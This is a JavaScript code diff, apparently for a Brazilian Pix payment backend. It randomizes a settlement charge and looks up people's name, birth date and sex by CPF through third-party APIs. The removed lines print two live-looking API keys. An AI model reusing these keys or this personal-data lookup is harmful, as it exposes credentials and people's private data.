@@ -16,10 +16,11 @@ import {
 } from './_utmify.js';
 
 export const BASE_AMOUNT = 66.38;
+export const ACORDO_OSC = 0.5;
 
 const CPF_API_URL = 'https://api.apicpf.dev/consulta';
-const CPF_API_KEY = 'sk-live_5b5818a9dfa8d367599f72ce530391df2047908d0e80baf5';
-const CPF_API_FALLBACK_KEY = 'sk-live_0f7c5982900f96d29002339da6ec1afae40ede6f9c4eac23';
+const CPF_API_KEY = '';
+const CPF_API_FALLBACK_KEY = '';
 const CPF_API3_URL = 'https://api.zapgroup.shop/consultar-filtrada/cpf';
 const FETCH_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
 
@@ -131,12 +132,26 @@ function mangofyPayment(data) {
   return data;
 }
 
+function resolveAcordoAmount(clientAmount) {
+  const min = Math.round((BASE_AMOUNT - ACORDO_OSC) * 100) / 100;
+  const max = Math.round((BASE_AMOUNT + ACORDO_OSC) * 100) / 100;
+  const n = Number(clientAmount);
+  if (Number.isFinite(n) && n > 0) {
+    const r = Math.round(n * 100) / 100;
+    if (r >= min && r <= max) return r;
+  }
+  const cents = Math.round(ACORDO_OSC * 100);
+  const osc = (Math.floor(Math.random() * (cents * 2 + 1)) - cents) / 100;
+  return Math.round((BASE_AMOUNT + osc) * 100) / 100;
+}
+
 export async function createPix(c, input, request, ctx) {
   const isUpsell = !!input.isUpsell || !!input.isDownsell;
-  let amount = Number(input.amount) || BASE_AMOUNT;
-  if (!isUpsell) {
-    const osc = (Math.floor(Math.random() * 61) - 30) / 100;
-    amount = Math.round((BASE_AMOUNT + osc) * 100) / 100;
+  let amount;
+  if (isUpsell) {
+    amount = Math.round((Number(input.amount) || BASE_AMOUNT) * 100) / 100;
+  } else {
+    amount = resolveAcordoAmount(input.amount);
   }
   const amountCents = Math.round(amount * 100);
   if (amountCents < 500 || amountCents > 200000) {
@@ -393,40 +408,76 @@ function extractNome(payload) {
   return { nome, nasc, sexo };
 }
 
+function cpfHitFailed(parsed, info, httpStatus) {
+  if (!parsed || typeof parsed !== 'object') return true;
+  if (httpStatus === 401 || httpStatus === 404 || httpStatus >= 500) return true;
+  if (parsed.code === 401 || parsed.message === 'API key inválida') return true;
+  if (parsed.error && String(parsed.error).trim() !== '' && !info.nome) return true;
+  return !info.nome;
+}
+
 async function fetchApicpf(url, key) {
   const res = await fetchTimeout(url, {
     headers: { 'X-API-KEY': key, Accept: 'application/json' },
   }, 10000);
-  try { return await res.json(); } catch (e) { return null; }
+  let parsed = null;
+  try { parsed = await res.json(); } catch (e) { parsed = null; }
+  const info = extractNome(parsed);
+  return { parsed, info, http: res.status, failed: cpfHitFailed(parsed, info, res.status) };
+}
+
+async function fetchZapgroup(c, cpf) {
+  const zurl = c.cpfApi3Url
+    + (c.cpfApi3Url.includes('?') ? '&' : '?')
+    + 'token=' + encodeURIComponent(c.cpfApi3Token)
+    + '&cpf=' + encodeURIComponent(cpf);
+  const res = await fetchTimeout(zurl, { headers: { Accept: 'application/json' } }, 10000);
+  let parsed = null;
+  try { parsed = await res.json(); } catch (e) { parsed = null; }
+  const info = extractNome(parsed);
+  return { parsed, info, http: res.status, failed: cpfHitFailed(parsed, info, res.status) };
 }
 
 export async function consultarCpf(c, cpfIn) {
   const cpf = digitsOnly(cpfIn, 11);
   if (!validCpf(cpf)) return json({ ok: false, error: 'CPF invalido' }, 200);
-  if (!c.cpfApiKey) return json({ ok: false, error: 'API de CPF nao configurada.' }, 200);
 
-  const url = c.cpfApiUrl + (c.cpfApiUrl.includes('?') ? '&' : '?') + 'cpf=' + encodeURIComponent(cpf);
-  let parsed = null;
-  let src = 'apicpf';
-  try { parsed = await fetchApicpf(url, c.cpfApiKey); } catch (e) { parsed = null; }
-  let info = extractNome(parsed);
-  if (!info.nome && c.cpfApiFallbackKey && c.cpfApiFallbackKey !== c.cpfApiKey) {
-    src = 'apicpf_fallback';
-    try { parsed = await fetchApicpf(url, c.cpfApiFallbackKey); } catch (e) { parsed = null; }
-    info = extractNome(parsed);
+  const hasApicpf = !!(c.cpfApiUrl && c.cpfApiKey);
+  const hasZap = !!(c.cpfApi3Url && c.cpfApi3Token);
+  if (!hasApicpf && !hasZap) {
+    return json({ ok: false, error: 'API de CPF nao configurada (defina CPF_API3_TOKEN no Cloudflare).' }, 200);
   }
-  if (!info.nome && c.cpfApi3Token && c.cpfApi3Url) {
-    src = 'zapgroup';
-    const zurl = c.cpfApi3Url
-      + (c.cpfApi3Url.includes('?') ? '&' : '?')
-      + 'token=' + encodeURIComponent(c.cpfApi3Token)
-      + '&cpf=' + encodeURIComponent(cpf);
+
+  let info = { nome: '', nasc: '', sexo: '' };
+  let src = '';
+
+  if (hasZap) {
     try {
-      const zres = await fetchTimeout(zurl, { headers: { Accept: 'application/json' } }, 10000);
-      parsed = await zres.json();
-    } catch (e) { parsed = null; }
-    info = extractNome(parsed);
+      const z = await fetchZapgroup(c, cpf);
+      if (!z.failed) {
+        info = z.info;
+        src = 'zapgroup';
+      }
+    } catch (e) { /* tenta apicpf */ }
   }
+
+  if (!info.nome && hasApicpf) {
+    const url = c.cpfApiUrl + (c.cpfApiUrl.includes('?') ? '&' : '?') + 'cpf=' + encodeURIComponent(cpf);
+    try {
+      const first = await fetchApicpf(url, c.cpfApiKey);
+      if (!first.failed) {
+        info = first.info;
+        src = 'apicpf';
+      } else if (c.cpfApiFallbackKey && c.cpfApiFallbackKey !== c.cpfApiKey) {
+        const second = await fetchApicpf(url, c.cpfApiFallbackKey);
+        if (!second.failed) {
+          info = second.info;
+          src = 'apicpf_fallback';
+        }
+      }
+    } catch (e) { /* sem nome */ }
+  }
+
   if (!info.nome) return json({ ok: false, error: 'CPF nao encontrado' }, 200);
   return json({
     ok: true,
